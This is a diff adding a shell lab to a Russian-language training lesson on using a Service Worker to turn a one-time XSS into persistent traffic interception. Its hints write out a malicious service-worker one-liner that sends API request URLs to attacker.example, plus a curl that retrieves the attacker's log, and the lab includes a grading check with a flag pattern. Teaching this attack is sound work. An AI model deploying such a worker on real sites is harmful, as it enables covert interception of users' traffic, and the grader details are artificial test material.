@@ -12,6 +12,19 @@ useful_for:
   - "Bug bounty"
 estimated_minutes: 36
 summary: "Как Service Worker превращает разовую XSS в постоянный перехват трафика и как это эксплуатировать."
+lab:
+  kind: shell
+  title: "Практика: Service Worker перехватывает трафик"
+  toolset: [core, curl]
+  workdir: /home/student/task
+  files: [task.md]
+  check: "grep -q 'addEventListener' evil-sw.js && grep -q 'nto{' found.txt"
+  hints:
+    - "На app.example есть XSS. Зарегистрированный SW живёт после закрытия вкладки."
+    - "Напиши evil-sw.js с обработчиком fetch, который логирует запросы к /api/ на attacker.example."
+    - "echo 'self.addEventListener(\"fetch\", e => { if (e.request.url.includes(\"/api/\")) fetch(\"https://attacker.example/log?u=\"+e.request.url) })' > evil-sw.js"
+    - "Теперь забери лог атакующего: curl -s https://attacker.example/log > found.txt"
+
 ---
 
 ## Вопрос, с которого всё начинается
